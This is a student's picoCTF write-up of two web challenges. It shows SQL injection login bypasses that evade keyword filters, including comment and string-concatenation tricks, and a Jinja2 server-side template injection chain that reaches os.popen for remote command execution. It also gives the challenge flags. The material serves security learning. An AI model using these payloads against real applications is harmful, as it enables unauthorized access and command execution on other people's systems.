# 1. web gauntlet

> Can you beat the filters?

## Solution:

- I have 2 websites, one asking for username and password, other displaying filter
- for round 1, filter is shown as or (meaning i cannot use OR SQLi). 
- I read on SQLi and learnt about the meanings of various injections
- I first put `admin' --` and put random characters in the password which cracked the round 1. (The filter changed to OR and -- meaning i cannot use the same SQLi later)
  <img width="1918" height="815" alt="image" src="https://github.com/user-attachments/assets/fd532249-1323-4c17-aff5-4f7a775b7e78" />

- For round 2 i used `admin' /*` and random password. filter changed to `or and = like > < --`
  <img width="1920" height="883" alt="image" src="https://github.com/user-attachments/assets/03dcc1fd-2973-49a4-a7dc-91eed06cb87a" />

- Round 3 i used `admin';` and filter changed to `Round4: or and = like > < -- admin` meaning for round 4, i cannot use `admin` in the username. (also notice how `;` was not blocked)
  <img width="1920" height="805" alt="image" src="https://github.com/user-attachments/assets/c707be27-21df-4320-b959-51ac4c750860" />

- I reasearched about it (took quite some time) and learnt about concatenation. So i used `ad'||'min';` and bypassed it. filter changed to `Round5: or and = like > < -- union admin`, meaning i can use the same trick again (since they did not block '||')
  <img width="1920" height="702" alt="image" src="https://github.com/user-attachments/assets/28e75dd8-6688-4573-826d-b214afb5ea2b" />

- So for round 5, i just put `ad'||'min';` again
- <img width="1920" height="728" alt="image" src="https://github.com/user-attachments/assets/1601b723-067a-4761-927d-a8a234eb8771" />
- Checking filter.php we get the backend code behind the website. We also get the flag
  <img width="1900" height="892" alt="image" src="https://github.com/user-attachments/assets/25511ee6-87e4-4b39-af12-0fc6fdbc3aa8" />



## Flag:

```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:

- When exploiting vulnerabilities (doing the SQLi thing), in the username place we use a valid name (like admin)
- The query we have here is `SELECT * FROM users WHERE username = 'user' AND password = 'user'`

## Notes:

- MISTAKE : THE PAGE KEPT RELOADING AND I KEPT LOSING THE SQLi I ALREADY DID WHICH FRUSTRATED ME A LITTLE BIT
- At first, i used the SQLi as `admin' ;` then `admin' /*` then `admin' --` but it kept getting stuck at round 3. After looking closely at the filters, i started using `admin' --` first, then `admin' /*` and then `;`. i still kept getting stuck on round 3. TURNS OUT, I WAS PUTTING AN UNECCESSARY SPACE BETWEEN "ADMIN" AND ";"

## Resources:

- (https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)


***
# 2. SSTI1

> I made a cool website where you can announce whatever you want! Try it out!

## Solution:

- Whatever you type in the input box will be outputted on the screen, for example if i type `hello`, it displays `hello` BUT if i type `{{7*7}}`, it displays `49`. this means there is a templating used
- on inputting `{{config.items()}}` (this displays system sensitive information) it outputted
 `dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])`
 (not helpful but i did it...)
- I then looked into RCE and got a builtin `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('(whatever comman)').read() }}` which will run whatever command is given in "whatever command" like how it would in a normal bash. 
- So i ran `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}` to list all the functions in it
  <img width="1915" height="587" alt="image" src="https://github.com/user-attachments/assets/6dcfabc6-3a3c-4f6d-b507-d6b68d5946d2" />
  We can try and read the .txt file given there
- `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}`
- This gave me the flag

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```

## Concepts learnt:
- SSTI - server side template injection
- RCE ( Remote Code Execution)


## Notes:

- ...i was trying to cat requirements...for some reason...
## Resources:

- https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038
- https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html


***
